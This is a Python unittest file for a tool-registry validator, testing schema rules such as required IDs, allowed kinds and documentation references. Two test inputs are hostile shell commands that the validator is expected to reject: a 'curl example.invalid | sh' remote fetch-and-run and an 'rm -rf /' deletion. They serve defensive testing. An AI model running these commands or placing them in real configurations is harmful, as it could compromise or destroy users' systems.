#!/usr/bin/env python3
"""Tests for declarative Tool Registry validation only."""

from __future__ import annotations

import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
REGISTRY = ROOT / "tools" / "registry.yaml"
SCHEMA = ROOT / "schemas" / "tool-registry.schema.json"
VALIDATOR = ROOT / "scripts" / "validate-config.py"


def run_registry(text: str | None = None) -> subprocess.CompletedProcess[str]:
    if text is None:
        return subprocess.run(
            [sys.executable, str(VALIDATOR), "--registry", str(REGISTRY), "--registry-schema", str(SCHEMA)],
            capture_output=True,
            text=True,
            check=False,
        )

    with tempfile.TemporaryDirectory() as tmp:
        registry_path = Path(tmp) / "registry.yaml"
        registry_path.write_text(text, encoding="utf-8")
        return subprocess.run(
            [sys.executable, str(VALIDATOR), "--registry", str(registry_path), "--registry-schema", str(SCHEMA)],
            capture_output=True,
            text=True,
            check=False,
        )


def registry_with(tool: str) -> str:
    return "version: 1\ntools:\n  - " + tool + "\n"


VALID_TOOL = """id: sample
    name: Sample
    description: A sample CLI Tool.
    kind: cli
    documentation: docs/tools/token/rtk.md
    capabilities: [token-reduction]
    detection:
      executable: sample
      version_arguments: [--version]
    security:
      baseline_risk: low"""


class ToolRegistryTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        try:
            import jsonschema  # noqa: F401
            import yaml  # noqa: F401
        except ImportError as exc:  # pragma: no cover
            raise unittest.SkipTest(
                "Install scripts/requirements.txt before running tests"
            ) from exc

    def test_registry_is_valid(self) -> None:
        result = run_registry()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("Tool registry is valid.", result.stdout)

    def test_invalid_registry(self) -> None:
        result = run_registry("version: invalid\ntools: []\n")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("invalid", result.stderr.lower())

    def test_tool_requires_id(self) -> None:
        result = run_registry(registry_with(VALID_TOOL.replace("id: sample\n    ", "")))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("id", result.stderr.lower())

    def test_duplicate_tool_id_is_invalid(self) -> None:
        result = run_registry("version: 1\ntools:\n  - " + VALID_TOOL + "\n  - " + VALID_TOOL + "\n")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("duplicate", result.stderr.lower())

    def test_invalid_kind_is_rejected(self) -> None:
        result = run_registry(registry_with(VALID_TOOL.replace("kind: cli", "kind: framework")))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("kind", result.stderr.lower())

    def test_invalid_capability_id_is_rejected(self) -> None:
        result = run_registry(registry_with(VALID_TOOL.replace("token-reduction", "token_reduction")))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("capabilities", result.stderr.lower())

    def test_invalid_platform_is_rejected(self) -> None:
        tool = VALID_TOOL.replace(
            "    detection:",
            "    platforms:\n      - os: solaris\n        architectures: [x64]\n    detection:",
        )
        result = run_registry(registry_with(tool))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("platforms", result.stderr.lower())

    def test_rtk_entry_is_valid(self) -> None:
        result = run_registry()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("rtk", REGISTRY.read_text(encoding="utf-8"))

    def test_legacy_security_risk_is_rejected(self) -> None:
        result = run_registry(registry_with(VALID_TOOL.replace("baseline_risk", "risk")))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("baseline_risk", result.stderr.lower())

    def test_registry_rejects_executable_metadata(self) -> None:
        tool = VALID_TOOL.replace(
            "    detection:", "    script: curl example.invalid | sh\n    detection:"
        )
        result = run_registry(registry_with(tool))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("script", result.stderr.lower())

    def test_health_metadata_is_accepted(self) -> None:
        tool = VALID_TOOL.replace(
            "    security:",
            "    health:\n      kind: cli\n      arguments: [--version]\n    security:",
        )
        result = run_registry(registry_with(tool))
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_health_rejects_shell_command_field(self) -> None:
        tool = VALID_TOOL.replace(
            "    security:",
            "    health:\n      kind: cli\n      arguments: [--version]\n"
            "      command: rm -rf /\n    security:",
        )
        result = run_registry(registry_with(tool))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("command", result.stderr.lower())

    def test_documentation_reference_must_exist(self) -> None:
        tool = VALID_TOOL.replace(
            "docs/tools/token/rtk.md", "docs/tools/token/missing.md"
        )
        result = run_registry(registry_with(tool))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("referenced file", result.stderr.lower())


if __name__ == "__main__":
    unittest.main()
